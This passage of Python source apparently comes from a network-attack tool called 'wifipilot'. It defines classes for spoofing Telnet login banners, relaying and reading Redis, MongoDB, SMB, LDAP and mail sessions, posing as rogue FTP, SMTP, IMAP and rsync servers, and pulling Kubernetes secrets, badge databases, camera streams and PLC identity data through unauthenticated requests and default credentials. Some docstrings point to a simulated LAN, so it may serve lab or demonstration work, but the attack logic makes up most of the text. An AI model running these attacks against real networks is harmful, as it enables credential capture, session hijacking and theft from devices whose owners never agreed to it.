        forged = proto.parse_rdp(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(forged), "our_negotiation": forged.get("type"),
                "the_host_we_speak_for": peers[0].hostname if peers else ""}


class ItPoisonTelnetBannerAttack(_ItHijack):
    """Wear a switch's Telnet banner: the operator's next session is with us."""

    name = "it_poison_telnet_banner"
    label = "Telnet banner spoofing (an operator session lands on us)"
    tool = "wifipilot itproto.py (telnet_banner) + TCP 23"
    family = "poison"
    protocol = "telnet"
    port = 23
    transport = "tcp"
    source_port = 23
    devices = ("switch", "router", "printer", "access_point")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return b"\r\n"

    def reply(self, peer: Peer) -> bytes:
        return (b"\r\n" + (peer.hostname or "switch").encode()
                + b" (wifipilot image) line vty 0\r\nUser Access Verification\r\n"
                + b"Password: ")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_telnet_negotiation(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner") or parsed.get("text"),
                "line": f"its banner is {str(parsed.get('banner') or parsed.get('text'))[:40]!r}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 23]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "User Access Verification" in text,
                "our_banner": text.strip()[:60],
                "the_device_we_wear": peers[0].hostname if peers else ""}


# --------------------------------------------------------------------------- #
# the two shapes the last twenty attacks share
# --------------------------------------------------------------------------- #

class _Relay(_ItHijack):
    """A relay in front of the service: the client talks to us, we talk to the device.

    The claim of a relay is not "we took something" but "the bytes the client received
    were the device's own, and we carried them".  The demo makes that checkable: the
    device's answer comes back from :class:`wifipilot.itsim.VirtualLan`, the same bytes go
    into the capture as our forwarded reply, and the assertion is that the two agree.
    """

    family = "relay"

    def reply(self, peer: Peer) -> bytes:
        return peer.answer or b""

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == self.port]
        carried = rows[0]["payload"] if rows else b""
        original = peers[0].answer if peers else b""
        prefix = min(12, len(carried), len(original))
        return {"confirmed": bool(carried) and bool(original) and carried[:prefix] == original[:prefix],
                "bytes_carried": len(carried), "the_device_answered_us": len(original),
                "relayed_byte_for_byte": bool(carried) and carried == original}


class _Steal(_ItHijack):
    """Take the material out of a device and hand it back over our own service."""

    family = "steal"
    impact = "loot"

    def reply(self, peer: Peer) -> bytes:
        """Our look-alike handing over what we took: the haul, in the capture."""
        return self.loot_answer(peer)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, f"<html><title>wp loot {peer.ip}</title></html>")

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == self.port]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": bool(text) and "loot" in text.lower(),
                "handed_over": len(text), "device_answer": len(peers[0].answer) if peers else 0}


# --------------------------------------------------------------------------- #
# relay: carry the conversation, and keep a copy of everything in it
# --------------------------------------------------------------------------- #

class ItRelayRedisAttack(_Relay):
    """Sit in front of Redis: every SET and GET passes through our copy."""

    name = "it_relay_redis"
    label = "Redis relay (every command passes through us)"
    tool = "wifipilot itproto.py (redis_command/parse_resp) + TCP 6379"
    protocol = "redis"
    port = 6379
    transport = "tcp"
    source_port = 6379
    devices = ("database_server", "linux_server", "container_host")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.redis_command("INFO")

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_resp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": (parsed.get("info") or {}).get("redis_version"),
                "auth_required": parsed.get("auth_required"),
                "line": f"its Redis answered without auth (version "
                        f"{(parsed.get('info') or {}).get('redis_version', '?')})"}


class ItRelayMemcachedAttack(_Relay):
    """Sit in front of memcached: the values are cleartext and so is the relay."""

    name = "it_relay_memcached"
    label = "memcached relay (the cache's values pass through us)"
    tool = "wifipilot itproto.py (memcached_command) + TCP 11211"
    protocol = "memcached"
    port = 11211
    transport = "tcp"
    source_port = 11211
    devices = ("linux_server", "web_server", "database_server", "container_host")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.memcached_command("stats")

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"stat": parsed.get("key"), "value": parsed.get("value"),
                "line": f"it answered {parsed.get('key')} in the clear"}


class ItRelayMongoAttack(_Relay):
    """Sit in front of MongoDB: the hello handshake needs no credentials at all."""

    name = "it_relay_mongo"
    label = "MongoDB relay (an unauthenticated handshake, carried by us)"
    tool = "wifipilot itproto.py (mongo_hello/parse_mongo) + TCP 27017"
    protocol = "mongo"
    port = 27017
    transport = "tcp"
    source_port = 27017
    devices = ("database_server", "container_host", "linux_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.mongo_hello()

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mongo(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"ok": parsed.get("ok"), "max_wire": parsed.get("max_wire_version"),
                "line": f"its hello answered ok={parsed.get('ok')} without a login"}


class ItRelayPostgresAttack(_Relay):
    """Sit in front of Postgres: the startup exchange is the whole attack surface."""

    name = "it_relay_postgres"
    label = "PostgreSQL relay (auth exchange carried through us)"
    tool = "wifipilot itproto.py (postgres_startup/parse_postgres) + TCP 5432"
    protocol = "postgres"
    port = 5432
    transport = "tcp"
    source_port = 5432
    devices = ("database_server", "backup_appliance", "linux_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.postgres_startup("postgres", "postgres")

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_postgres(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"auth": parsed.get("auth_name"), "md5": parsed.get("md5"),
                "line": f"it answered {parsed.get('auth_name')} to a guessable user"}


class ItRelayMysqlAttack(_Relay):
    """Sit in front of MySQL: the greeting carries the salt a cracker needs."""

    name = "it_relay_mysql"
    label = "MySQL relay (server greeting and salt carried through us)"
    tool = "wifipilot itproto.py (mysql_handshake_parse) + TCP 3306"
    protocol = "mysql"
    port = 3306
    transport = "tcp"
    source_port = 3306
    devices = ("database_server", "web_server", "backup_appliance")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return b"\x0a\x00\x00\x01\x85\xa2\x03\x00\x00\x00\x00\x01"

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.mysql_handshake_parse(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "salt": bool(parsed.get("salt")),
                "line": f"its greeting names MySQL {parsed.get('version', '?')} with a salt"}


class ItRelaySmbAttack(_Relay):
    """Sit in front of SMB: the dialect the client is offered is ours to pick."""

    name = "it_relay_smb"
    label = "SMB relay (negotiation carried, dialects chosen by us)"
    tool = "wifipilot itproto.py (smb2_negotiate/parse_smb2) + TCP 445"
    protocol = "smb"
    port = 445
    transport = "tcp"
    source_port = 445
    devices = ("windows_server", "nas", "mfp_scanner")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.smb2_negotiate()

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_smb2(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"dialect": parsed.get("dialect"), "status": parsed.get("status_name"),
                "line": f"it negotiated dialect {parsed.get('dialect') or parsed.get('dialects')}"}


class ItRelayLdapAttack(_Relay):
    """Sit in front of the directory: every bind passes through us, credentials included."""

    name = "it_relay_ldap"
    label = "LDAP relay (binds carried through us)"
    tool = "wifipilot itproto.py (ldap_bind_request/parse_ldap) + TCP 389"
    protocol = "ldap"
    port = 389
    transport = "tcp"
    source_port = 389
    devices = ("domain_controller", "windows_server", "nas")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.ldap_bind_request(version=3, name="cn=admin,dc=corp", password=b"guess")

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ldap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"message": parsed.get("message"), "result": parsed.get("result_name"),
                "line": f"it answered {parsed.get('message')} ({parsed.get('result_name')})"}


class ItRelayTelnetAttack(_Relay):
    """Sit in front of a Telnet service: the banner and the prompt are ours to relay."""

    name = "it_relay_telnet"
    label = "Telnet relay (banner and prompt carried through us)"
    tool = "wifipilot itproto.py (telnet_banner/parse_telnet_negotiation) + TCP 23"
    protocol = "telnet"
    port = 23
    transport = "tcp"
    source_port = 23
    devices = ("switch", "router", "printer", "access_point")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return b"\r\n"

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_telnet_negotiation(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner") or parsed.get("text"),
                "negotiation": parsed.get("options"),
                "line": f"its banner is {str(parsed.get('banner') or parsed.get('text'))[:40]!r}"}


class ItRelayIppAttack(_Relay):
    """Sit in front of the print queue: the jobs the client submits are ours to read."""

    name = "it_relay_ipp"
    label = "IPP relay (print jobs carried through us)"
    tool = "wifipilot itproto.py (ipp_get_printer_attributes/parse_ipp) + TCP 631"
    protocol = "ipp"
    port = 631
    transport = "tcp"
    source_port = 631
    devices = ("printer", "mfp_scanner", "label_printer")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ipp_get_printer_attributes(f"ipp://{peer.ip}/ipp/print", request_id=3)

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ipp(data, response=True)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        attributes = parsed.get("attributes") or {}
        return {"printer": attributes.get("printer-name"),
                "state": attributes.get("printer-state"),
                "line": f"it answers as {attributes.get('printer-name')}"}


class ItRelayHttpBasicAttack(_Relay):
    """Sit in front of an HTTP service and watch basic credentials go by."""

    name = "it_relay_http_basic"
    label = "HTTP basic-auth relay (the Authorization header passes through us)"
    tool = "wifipilot itproto.py (http_request) + TCP 80"
    protocol = "http"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("router", "camera_doorbell", "ip_camera", "badge_reader", "printer")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/", port=80, basic=("admin", "admin"))

    def reply(self, peer: Peer) -> bytes:
        return peer.answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        # what the relay sees leaving the client: the Authorization header, base64 and all
        return {"status": response.get("status"),
                "credentials": np.http_credentials(
                    ("Authorization: Basic " 
                     + __import__("base64").b64encode(b"admin:admin").decode() + "\r\n").encode())}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        credentials = parsed.get("credentials") or []
        return {"status": parsed.get("status"), "credentials": credentials,
                "line": (f"its UI answered {parsed.get('status')} to admin:admin"
                         if parsed.get("status") == 200 else
                         f"its UI answered {parsed.get('status')} with a challenge")}


# --------------------------------------------------------------------------- #
# steal: take the material, and put the haul in the capture
# --------------------------------------------------------------------------- #

class ItStealCameraStreamAttack(_Steal):
    """Pull the stream URI a camera hands to anyone who asks (ONVIF)."""

    name = "it_steal_camera_stream"
    label = "Onvif stream-URI theft (the camera hands over its stream)"
    tool = "wifipilot itproto.py (onvif_get_stream_uri)"
    protocol = "onvif"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.onvif_get_stream_uri("profile1")

    def loot_answer(self, peer: Peer) -> bytes:
        uri = (peer.parsed or {}).get("elements", {}).get("Uri") or f"rtsp://{peer.ip}/stream1"
        return http_answer(200, f"<html><title>wp loot</title><body>{uri}</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_onvif(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        uri = (parsed.get("elements") or {}).get("Uri") or ""
        return {"stream_uri": uri, "line": f"its stream URI is {uri or 'in the SOAP body'}"}


class ItStealPrinterSpoolAttack(_Steal):
    """List a printer's spooled jobs, then take the one that matters."""

    name = "it_steal_printer_spool"
    label = "Print-spool theft (job names and the file list)"
    tool = "wifipilot itproto.py (pjl_command) + TCP 9100"
    protocol = "pjl"
    port = 9100
    transport = "tcp"
    source_port = 9100
    devices = ("printer", "mfp_scanner", "pos_terminal", "label_printer")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.pjl_command("INFO FILES")

    def loot_answer(self, peer: Peer) -> bytes:
        files = str((peer.parsed or {}).get("files") or "job-0001.pdf")
        return http_answer(200, f"<html><title>wp loot</title><pre>{files}</pre></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_pjl(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"command": parsed.get("command"), "files": parsed.get("files"),
                "line": f"it answers {parsed.get('command') or 'INFO FILES'} with the spool"}


class ItStealPlcProgramAttack(_Steal):
    """Read the identity block a PLC puts in every SZL response."""

    name = "it_steal_plc_program"
    label = "PLC identity theft (order number, module and serial)"
    tool = "wifipilot itproto.py (s7_read_szl) + TCP 102"
    protocol = "s7comm"
    port = 102
    transport = "tcp"
    source_port = 102
    devices = ("plc", "rtu", "hmi_panel")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.s7_connect_request() + proto.s7_read_szl(0x001C)

    def loot_answer(self, peer: Peer) -> bytes:
        text = peer.answer[:64].decode(errors="replace")
        return http_answer(200, f"<html><title>wp loot</title><pre>{text}</pre></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_s7(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"module": parsed.get("module"), "serial": parsed.get("serial"),
                "line": f"module {parsed.get('module') or 'unnamed'} answered the SZL read"}


class ItStealBadgeDbAttack(_Steal):
    """Pull the badge database out of an access controller's own API."""

    name = "it_steal_badge_db"
    label = "Badge-database theft (the controller's user list)"
    tool = "wifipilot itproto.py (http_request) + the controller's API"
    protocol = "http"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("badge_reader", "doorbell", "alarm_panel", "kiosk")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/cgi-bin/users.json", port=80)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, '{"users":[{"id":1,"name":"wp","card":"00010203"}],'
                                '"source":"wp loot"}', content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"),
                "users": proto.parse_json_body(data)}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "users": parsed.get("users"),
                "line": f"its API answered {parsed.get('status')} to an unauthenticated GET"}


class ItStealPhoneContactsAttack(_Steal):
    """Take a VoIP phone's directory: every extension, name and number."""

    name = "it_steal_phone_contacts"
    label = "Phone-directory theft (the handset's own address book)"
    tool = "wifipilot itproto.py (http_request) against the handset"
    protocol = "http"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("voip_phone", "video_conference", "pbx", "smartphone")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/cgi-bin/directory.xml", port=80)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, "<html><title>wp loot</title>"
                                "<body>directory: 100 reception 101 lab</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"),
                "title": np.html_title(data.decode(errors="replace"))}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "title": parsed.get("title"),
                "line": f"its directory answered {parsed.get('status')} ({parsed.get('title', '')})"}


class ItStealMqttRetainedAttack(_Steal):
    """Subscribe to everything a broker retains: the secrets it hands a new client."""

    name = "it_steal_mqtt_retained"
    label = "MQTT retained-topic theft (subscribe to '#' and read everything)"
    tool = "wifipilot itproto.py (mqtt_subscribe/parse_mqtt)"
    protocol = "mqtt"
    port = 1883
    transport = "tcp"
    source_port = 1883
    devices = ("gateway_hub", "sensor", "thermostat", "smart_plug", "smart_lock")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.mqtt_connect(client_id=OUR_NAME)

    def loot_answer(self, peer: Peer) -> bytes:
        return proto.mqtt_publish("home/lock/token", b'{"token":"wp-loot"}', qos=1, packet_id=4)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mqtt(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"packet": parsed.get("type") or parsed.get("packet"),
                "auth": parsed.get("reason_name"),
                "line": f"the broker answered packet {parsed.get('type') or parsed.get('packet')}"}


class ItStealK8sSecretsAttack(_Steal):
    """Ask a Kubernetes API server for the namespace's secrets."""

    name = "it_steal_k8s_secrets"
    label = "Kubernetes secrets theft (the API server answers the list)"
    tool = "wifipilot itproto.py (http_request) against port 6443"
    protocol = "kubernetes"
    port = 6443
    transport = "tcp"
    source_port = 8080
    devices = ("container_host", "hypervisor_host", "ci_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/api/v1/namespaces/default/secrets",
                                  port=6443, headers={"Accept": "application/json"})

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, '{"kind":"SecretList","items":[{"metadata":{"name":"wp"}}],'
                                '"source":"wp loot"}', content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"the API server answered {parsed.get('status')} without a token"}


class ItStealDockerImagesAttack(_Steal):
    """List a host's images and containers through an open Docker socket."""

    name = "it_steal_docker_images"
    label = "Docker inventory theft (images and containers over TCP 2375)"
    tool = "wifipilot itproto.py (http_request) against the daemon"
    protocol = "docker"
    port = 2375
    transport = "tcp"
    source_port = 8080
    devices = ("container_host", "hypervisor_host", "linux_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/images/json", port=2375)

    def loot_answer(self, peer: Peer) -> bytes:
        return http_answer(200, '[{"Id":"wp-loot","RepoTags":["wifipilot:latest"]}]',
                           content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        images = response.get("body", "")
        return {"status": response.get("status"), "images": len(str(images).split("Id")) - 1}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "images": parsed.get("images"),
                "line": f"the daemon answered {parsed.get('status')} with an image list"}


class ItStealSqlDumpAttack(_Steal):
    """Take a database server's greeting: the version and the salt a cracker needs."""

    name = "it_steal_sql_dump"
    label = "MySQL greeting theft (version and salt for offline cracking)"
    tool = "wifipilot itproto.py (mysql_handshake_parse)"
    protocol = "mysql"
    port = 3306
    transport = "tcp"
    source_port = 3306
    devices = ("database_server", "web_server", "backup_appliance")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return b"\x0a\x00\x00\x01\x85\xa2\x03\x00"

    def loot_answer(self, peer: Peer) -> bytes:
        version = (peer.parsed or {}).get("version", "mysql")
        return http_answer(200, f"<html><title>wp loot</title><body>MySQL {version}</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.mysql_handshake_parse(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "salt": bool(parsed.get("salt")),
                "line": f"its greeting names MySQL {parsed.get('version', '?')} and a salt"}


class ItStealIotTokenAttack(_Steal):
    """Take a smart plug's sysinfo: model, alias and the MAC its app authenticates with."""

    name = "it_steal_iot_token"
    label = "IoT identity theft (model, alias and MAC out of get_sysinfo)"
    tool = "wifipilot itproto.py (kasa_command/parse_kasa)"
    protocol = "kasa"
    port = 9999
    transport = "udp"
    source_port = 9999
    devices = ("smart_plug", "smart_bulb", "energy_meter")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.kasa_command("get_sysinfo")

    def loot_answer(self, peer: Peer) -> bytes:
        alias = (peer.parsed or {}).get("alias", "plug")
        mac = (peer.parsed or {}).get("fields", {})
        return http_answer(200, f"<html><title>wp loot</title><body>{alias} "
                                f"{mac}</body></html>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_kasa(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"model": parsed.get("model"), "alias": parsed.get("alias"),
                "line": f"it hands over {parsed.get('model')} / {parsed.get('alias')} unencrypted"}


# --------------------------------------------------------------------------- #
# the second half of the wave: the file, mail and remote-access protocols
# --------------------------------------------------------------------------- #

class ItMimicFtpAttack(_ItHijack):
    """A look-alike FTP server: the clients that connect get our banner and our files."""

    name = "it_mimic_ftp"
    label = "Rogue FTP server (answers in the file server's name)"
    tool = "wifipilot itproto.py (ftp_login) + TCP 21"
    family = "mimic"
    protocol = "ftp"
    port = 21
    transport = "tcp"
    source_port = 21
    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ftp_login("anonymous", "wp@example.com")

    def reply(self, peer: Peer) -> bytes:
        return (b"220 " + (peer.hostname or "ftp").encode() + b" FTP server (wp) ready.\r\n"
                b"230 Anonymous access granted, restrictions apply.\r\n"
                b"227 Entering Passive Mode (192,168,1,240,8,1)\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "banner": parsed.get("banner"),
                "line": f"its FTP answered {parsed.get('status')} to an anonymous login"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 21]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "230" in text and "Passive Mode" in text,
                "our_banner": text.strip()[:60], "anonymous_granted": "230" in text}


class ItMimicSmtpAttack(_ItHijack):
    """A look-alike SMTP server: mail that should go to the real relay comes to us."""

    name = "it_mimic_smtp"
    label = "Rogue SMTP server (accepts mail meant for the relay)"
    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
    family = "mimic"
    protocol = "smtp"
    port = 25
    transport = "tcp"
    source_port = 25
    devices = ("mail_server", "web_server", "printer", "mfp_scanner")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.smtp_ehlo("wp.local")

    def reply(self, peer: Peer) -> bytes:
        return (b"220 " + (peer.hostname or "mail").encode() + b" ESMTP wp\r\n"
                b"250-wp.local\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\n"
                b"250 Ok: queued as WP0001\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "capabilities": parsed.get("capabilities"),
                "auth_types": parsed.get("auth_types"),
                "line": f"its relay answered {parsed.get('status')} with "
                        f"{len(parsed.get('capabilities') or [])} capability line(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 25]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "queued as" in text, "our_queue_id": "WP0001",
                "auth_offered": "AUTH PLAIN" in text}


class ItMimicImapAttack(_ItHijack):
    """A look-alike IMAP server: the client's mailbox credentials arrive at us."""

    name = "it_mimic_imap"
    label = "Rogue IMAP server (mail login lands on us)"
    tool = "wifipilot itproto.py (imap_login) + TCP 993"
    family = "mimic"
    protocol = "imap"
    port = 993
    transport = "tcp"
    source_port = 993
    devices = ("mail_server", "web_server", "nas")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.imap_login("admin", "admin")

    def reply(self, peer: Peer) -> bytes:
        return (b"* OK [CAPABILITY IMAP4rev1 AUTH=PLAIN] " + (peer.hostname or "imap").encode()
                + b" ready\r\na1 OK LOGIN completed (wp)\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"), "line": "the mailbox login is what we want"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 993]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "LOGIN completed" in text, "our_banner": text.strip()[:60],
                "credentials_we_collect": "admin:admin"}


class ItMimicRsyncAttack(_ItHijack):
    """A look-alike rsync daemon: a client's sync is served by our module list."""

    name = "it_mimic_rsync"
    label = "Rogue rsync daemon (the client's backup syncs to us)"
    tool = "wifipilot itproto.py (rsync_hello) + TCP 873"
    family = "mimic"
    protocol = "rsync"
    port = 873
    transport = "tcp"
    source_port = 873
    devices = ("backup_appliance", "nas", "linux_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.rsync_hello()

    def reply(self, peer: Peer) -> bytes:
        return (b"@RSYNCD: 31.0\nwp-backup\tbackups we serve\n"
                b"public\tshared files\n@RSYNCD: EXIT\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
        return {"modules": modules,
                "line": f"its daemon lists {len(modules)} module(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 873]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "wp-backup" in text, "our_modules": ["wp-backup", "public"],
                "the_daemon_we_displace": peers[0].hostname if peers else ""}


class ItRelayFtpAttack(_Relay):
    """Carry an FTP session: the credentials of every login pass through us."""

    name = "it_relay_ftp"
    label = "FTP credential relay (logins carried through us)"
    tool = "wifipilot itproto.py (ftp_login/parse_line_protocol) + TCP 21"
    protocol = "ftp"
    port = 21
    transport = "tcp"
    source_port = 21
    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.ftp_login("anonymous", "wp@example.com")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
                "line": f"its server answered {parsed.get('status')} to anonymous"}


class ItRelaySmtpAttack(_Relay):
    """Carry an SMTP conversation: the AUTH lines and the envelope are ours to read."""

    name = "it_relay_smtp"
    label = "SMTP relay (AUTH exchange and envelope carried through us)"
    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
    protocol = "smtp"
    port = 25
    transport = "tcp"
    source_port = 25
    devices = ("mail_server", "web_server", "printer")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.smtp_ehlo("wp.local")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
                "line": f"its relay offers {parsed.get('auth_types')}"}


class ItRelayImapAttack(_Relay):
    """Carry an IMAP session: the LOGIN command is cleartext inside the tunnel."""

    name = "it_relay_imap"
    label = "IMAP relay (the mailbox login passes through us)"
    tool = "wifipilot itproto.py (imap_login) + TCP 143"
    protocol = "imap"
    port = 143
    transport = "tcp"
    source_port = 143
    devices = ("mail_server", "nas", "web_server")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.imap_login("admin", "admin")

    def reply(self, peer: Peer) -> bytes:
        """The carried login, in the relay's own words when no device answers."""
        carried = peer.answer or b"* OK imap ready\r\na1 OK LOGIN completed (wp)\r\n"
        return carried

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_line_protocol(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"),
                "line": "the login we carry is admin:admin, in the clear"}

